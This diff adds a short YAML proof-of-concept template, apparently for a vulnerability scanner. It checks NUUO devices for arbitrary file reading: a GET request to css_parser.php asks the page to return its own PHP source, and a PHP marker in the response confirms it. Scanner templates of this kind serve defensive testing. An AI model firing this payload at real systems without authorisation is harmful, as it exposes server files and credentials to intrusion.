@@ -1,0 +1,20 @@
+name: poc-yaml-NUUO-css_parser.php-File-reading
+transport: http
+
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /css_parser.php?css=css_parser.php
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
+    expression: response.status == 200 && response.body.bcontains(b'echo $file;') && response.body.bcontains(b'<?php')
+expression: r0()
+
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247487417&idx=1&sn=701faa49786e548432cd86eaf78e4144&chksm=c267ba8af510339c6356cf368f74d1ad5cfe009093c3401fe15cfa4209e07f93dc77fd1ce3f5&token=286085064&lang=zh_CN#rd
+
+
